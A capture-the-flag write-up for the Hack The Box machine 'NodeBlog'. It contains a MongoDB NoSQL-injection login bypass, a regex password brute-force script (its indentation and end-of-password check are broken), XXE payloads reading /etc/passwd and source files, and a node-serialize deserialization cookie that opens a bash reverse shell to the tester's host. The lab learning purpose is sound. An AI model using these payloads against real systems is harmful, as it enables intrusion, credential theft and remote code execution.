+++
title = "HTB - NodeBlog"
date = 2024-11-27
+++

### Scan
```
└─# nmap -sC -sV --open -p- 10.10.11.139
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 20:18 EDT
Nmap scan report for 10.10.11.139
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Nodjs (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumeration
NodeJS instance on 5000, blog site. Powered by Express. Burp to Validate
Login prompt leaks information. We know that `admin` is a valid username
We can try SQLi, but familiarity with NodeJS points to another type of non-sql db.
We can intercept with Burp and put our injection. Improper error handling will let us know that we're dealing with JSON. Try an injection and see. We need to edit the POST request in two ways. Format our login injection for JSON, and edit the Content-Type from `application/www...` to `application/json`. Pairing that with our formatted login:
```JSON
{
	"user":"admin",
	"password": {
		"$ne":"admin"
	}
}
```
$ne is not equals to, and $regex .* is another operator that leaks data.
We will get an authorization cookie. We could logon this way, but we could also gain credentials with a bit more work.
Once we understand how the database works and how we can leverage MongoDB knowledge, we can build a python script to bruteforce credentials one letter at a time (just like with Help)!
Ippsec script and great explanation in video.
```python
import requests
import json
import string
import sys

def login(pw):
	payload = '{ "$regex": "%s" }' % pw
	data = { "user":"admin", "password": json.loads(payload) }
	r = requests.post("http://10.10.11.139:5000/login", json=data)
	if "Invalid Password" in r.text:
		return False
	return True

password = '^'
stop = False
while stop == False:
	for i in string.ascii_letters:
	sys.stdout.write(f"\r{password}{i}")
	if login(f"{password}{i}"):
		password += i
		if login(f"password$"):
			sys.stdout.write(f"\r{password}\r\n")
			sys.stdout.flush()
			stop = True
			break
		break
```
We get the credentials `admin:IppsecSaysPleaseSubscribe`
When we try and upload a file, we're met with an error that leaks a bit more information. It is an XML template, pointing to an XXLAnything Injection. PayloadsAllTheThings has examples we can use to try and get code execution.
This is the template we get from the website
```xml
<post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```
We can combine with our payload to get etc/passwd as a poc.:
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><post><title>Example Post</title><description>&test;</description><markdown>Example Markdown</markdown></post>
```
Note that the entities must match as well.

Remember the error handling from ealier, when we figured out it was JSON? We can see the directory and infer that the blog resides in /opt/blog/server.js . This comes with familiartiy. app.py is popular with flask and whatnot.

We can look at server.js for source code of application

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///opt/blog/server.js'>]><post><title>Example Post</title><description>&test;</description><markdown>Example Markdown</markdown></post>
```

Looking at the source code, we can take note of the node serialize function. This has a code execution path. we can pass it a function parameter that executes code. read more about this. We can deserialize the hash beacuse its just an md5sum.
We can find our cookie through inspect element, put into burp decoder to validate that it is JSON

We need to put the deserialization function in the cookie for RCE. [CVE-2017-5941 Open this link in a new tab](https://www.cve.org/CVERecord?id=CVE-2017-5941)

Intercept a request on the main page where you are authorized, url decode the cookie, and edit as such:

We can update the payload from Snyk with a bash one-liner encoded in base64. Make sure to edit so that there are no '+' in it, as it throws errors in html
`echo -n 'bash -i  >& /dev/tcp/10.10.14.2/9001  0>&1' | base64`
`echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi85MDAxICAwPiYx | base64 -d | bash`

Modified Burp Request:
```
GET / HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: auth=%7b%22%75%73%65%72%22%3a%22%61%64%6d%69%6e%22%2c%22%73%69%67%6e%22%3a%22%32%33%65%31%31%32%30%37%32%39%34%35%34%31%38%36%30%31%64%65%62%34%37%64%39%61%36%63%37%64%65%38%22%2c%22%4f%6f%66%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%67%50%69%59%67%4c%32%52%6c%64%69%39%30%59%33%41%76%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%69%38%35%4d%44%41%78%49%43%41%77%50%69%59%78%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d
Upgrade-Insecure-Requests: 1
If-None-Match: W/"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA"
```

Payload without COMPLETE url encoding
```
Cookie: {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","Oof":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi85MDAxICAwPiYx | base64 -d | bash\", function(error, stdout, stderr) { console.log(stdout) });}()"}
```

We get a shell
Priv with the same password as earlier!

USer:`bbe120c440df75b67b1599bd3d11bc29`
Root:`28392878efbb67f0f9edd7ece926b2f5`

### Initial Access
### Privilege Escalation